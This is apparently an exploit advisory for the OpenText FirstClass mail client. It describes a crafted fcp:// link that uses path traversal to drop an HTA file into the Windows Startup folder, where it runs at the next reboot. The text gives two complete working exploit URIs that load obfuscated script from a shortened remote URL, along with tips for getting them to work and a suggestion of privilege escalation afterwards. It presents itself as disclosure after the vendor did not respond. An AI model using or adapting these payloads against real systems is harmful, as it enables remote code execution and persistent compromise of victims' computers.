@@ -1,0 +1,87 @@
+# Exploit Title: OpenText FirstClass Client (Delayed) Code Executiion
+# Date: Discovered 11/16/2010, Contacted OpenText 2/1/11 and 2/7/11,
+Released 4/11/2011
+# Author: Kyle Ossinger (www.k0ss.net)
+# Email: security@k0ss.net
+# Software Link:
+http://www3.firstclass.com/ClientDownloads/FC11ClientDownloadFiles/FC11005US.exe
+# Version: v.11 and lower, but will probably work on newer versions
+once they are released
+# Tested on: Windows XP, Vista, 7
+# CVE : none, no response from MITRE about this
+
+DISCLAIMER
+--------------------
+I contacted OpenText about this issue twice over the period of a few
+weeks and they never responded.  This is why I'm releasing the exploit
+now; so it has a better chance of being patched.
+I take no responsibility for how anyone uses the following
+information.  I only hope this helps the exploit developers think
+outside the box of overflow exploits in executable programs.  Any
+testing of the following information should be used in an isolated
+network using a FirstClass server that you own and operate or have
+permission to try this out on.
+
+
+ABOUT
+-----------
+This is an implementation flaw, not your usual buffer overflow/heap
+overflow/format string exploit.
+By getting a victim to click on a specially crafted link in the
+FirstClass mail client, an attacker can place an executable file on
+the victim's computer which will be executed upon the next system
+reboot.
+
+The way it works is that you can make a URI to create a settings file
+for the user to use, by crafting it as such:
+fcp://username:password(optional)@servername.tld;settingsfilename.fc
+
+Whatever you put into username and servername gets put into the
+settings file as plain-text, so that is how I inject some code.  You
+normally can't change the file extension though (seen at the end of
+the URI), but after a lot of tinkering I found that if you make the
+URI try to access a path inside of the firstclass server, you (for
+some reason) CAN change the file extension.  Since I had to inject
+some commands into this file to make it execute code, but it is
+surrounded by junk characters that would break any compiled executable
+or even batch scripts, I knew I'd have to use an HTML Application
+(HTA) file, which does indeed work wonderfully.
+
+
+THE EXPLOIT URI
+---------------------------
+The following URI will add the executable file to the startup programs
+directory of every user on the computer, given that the current user
+has write access to the All Users directory on windows.  An attacker
+would only use this if he or she were certain that the victim user is
+an Administrator on his or her computer.
+
+fcp://<hta><script src='is.gd/9JR6g0' id="s"></script>@<body
+onload=(s.src="http"%2bString.fromCharCode(58)%2bString.fromCharCode(47)%2BString.fromCharCode(47)%2Bs.src)>/j;%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cAll%20Users%5cStart%20Menu%5cPrograms%5cStartup%5ca%2ehta
+
+The following URI will add that same executable file to the CURRENT
+USER's startup programs directory, but maybe afterwards the attacker
+could launch some privilege escalation exploits to get the desired
+access.
+
+fcp://<hta><script src='is.gd/9JR6g0' id="s"></script>@<body
+onload=(s.src="http"%2bString.fromCharCode(58)%2bString.fromCharCode(47)%2BString.fromCharCode(47)%2Bs.src)>/j;%2e%2e%5c%2e%2e%5c%2e%2e%5cStart%20Menu%5cPrograms%5cStartup%5ca%2ehta
+
+If you want to understand more of how this exploit works please check
+out www.k0ss.net, but if you just want to know the basic idea of how
+it works these basics will have to suffice.
+The <script src=> needs to point to your javascript file which uses
+only javascript that WSH can understand.  Also, the URL pointing to
+your script file must be made into a small URL in order to fit size
+constraints.  Make sure to strip off the "http://" part from the
+script URL as well, as it would break the exploit.
+
+
+NOTE: The URI can be a bit finicky when trying to put it into a
+bookmark/link on FirstClass.  It usually adds 2 random CRLF
+characters, and gets rid of the 'a' in "hta".  You can correct this
+and hit Ok again, and it will look normal again and work.  It's just
+something to check if it isn't working on your test machine.
+
+A complete write-up on how this particular exploit works can be viewed
+at www.k0ss.net
